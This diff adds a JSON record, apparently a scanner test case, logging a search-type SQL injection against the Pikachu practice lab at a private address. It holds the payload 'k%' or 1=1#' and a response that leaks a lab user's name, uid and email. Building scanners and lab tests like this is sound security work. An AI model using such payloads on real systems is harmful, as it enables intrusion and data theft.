@@ -1,0 +1,18 @@
+{
+    "request": {
+      "host": "10.10.1.1",
+      "method": "get",
+      "url": "http://10.10.1.1:10000/vul/sqli/sqli_search.php?name=111&submit=搜索",
+      "cookie": "",
+      "requestheader": "",
+      "requestbody": "k%' or 1=1#"
+    },
+    "response": {
+      "statuscode": 200,
+      "statusmessage": "[+] 存在搜索型sql注入",
+      "responsetime": "",
+      "responseheader": "",
+      "responsebody": "<p class='notice'>username：vince<br />uid:1 <br />email is: vince@pikachu.com</p>"
+    }
+  }
+  
